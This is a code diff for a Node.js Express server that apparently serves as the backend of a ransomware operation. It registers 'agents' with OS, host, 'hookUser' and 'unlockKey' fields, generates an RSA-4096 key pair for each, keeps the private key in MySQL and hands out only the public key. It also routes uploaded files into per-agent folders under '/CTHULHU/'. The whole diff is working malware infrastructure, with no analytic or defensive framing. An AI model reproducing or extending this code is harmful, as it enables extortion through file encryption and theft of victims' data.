@@ -2,7 +2,18 @@ const express = require('express');
 const mysql = require('mysql');
 const util = require("util");
 const multer = require("multer");
+const crypto = require("crypto");
+const fs = require('fs');
 const maxSize = 2 * 1024 * 1024;
+
+try {
+  const folderName = "/CTHULHU/users"
+  if (!fs.existsSync(folderName)) {
+    fs.mkdirSync(folderName);
+  }
+} catch (err) {
+  console.log(err)
+}
 
 const app = express();
 const port = 5000;
@@ -30,7 +41,7 @@ db.connect((err) => {
 
 let storage = multer.diskStorage({
   destination: (req, file, cb) => {
-    cb(null, __basedir + "/resources/static/assets/uploads/");
+    cb(null, "/CTHULHU/");
   },
   filename: (req, file, cb) => {
     console.log(file.originalname);
@@ -55,10 +66,27 @@ app.post('/api/agent/new', (req, res) => {
     req.body.hookUser != undefined &&
     req.body.unlockKey != undefined
   ) {
-    // Insert data into MySQL
-    const sql = `INSERT INTO agent (versionOS, hosts, hookUser, unlockKey) VALUES (?, ?, ?, ?)`;
-    const values = [req.body.versionOS, req.body.hosts, req.body.hookUser, req.body.unlockKey];
 
+    // Generate RSA key pair
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
+      modulusLength: 4096,
+      publicKeyEncoding: {
+        type: 'spki',
+        format: 'pem'
+      },
+      privateKeyEncoding: {
+        type: 'pkcs8',
+        format: 'pem'
+      }
+    });
+
+    const publicKeyStr = publicKey.toString();
+
+    // Insert data into MySQL
+    const sql = `INSERT INTO agent (versionOS, hosts, hookUser, unlockKey, privKey, pubKey) VALUES (?, ?, ?, ?, ?, ?)`;
+    const values = [req.body.versionOS, req.body.hosts, req.body.hookUser, req.body.unlockKey, privateKey.toString(), publicKeyStr];
+
+    // Insert data into MySQL without keys
     db.query(sql, values, (err, result) => {
       if (err) {
         JSON_RES.error = { errorMsg: "Error inserting data into MySQL " + err.stack }
@@ -68,12 +96,27 @@ app.post('/api/agent/new', (req, res) => {
         return;
       }
       console.log('Inserted data into MySQL with ID ' + result.insertId);
-      JSON_RES.data = { id: result.insertId }
+      JSON_RES.data = { id: result.insertId, publicKey: publicKeyStr }
+
+      try {
+        const folderName = "/CTHULHU/users" + result.insertId
+        if (!fs.existsSync(folderName)) {
+          fs.mkdirSync(folderName);
+        }
+      } catch (err) {
+        JSON_RES.error = { errorMsg: err }
+
+        res.status(500)
+        res.json(JSON_RES);
+        res.end();
+        return;
+      }
 
       res.status(200)
       res.json(JSON_RES);
       res.end();
     });
+
   } else {
     JSON_RES.error = { errorMsg: "Bad parameters" }
     res.status(400)
@@ -83,7 +126,7 @@ app.post('/api/agent/new', (req, res) => {
 
 });
 
-// API endpoint for receiving data
+// API endpoint for receiving files
 app.post('/api/file/upload', async (req, res) => {
   var JSON_RES = { data: {}, error: {} }
   try {
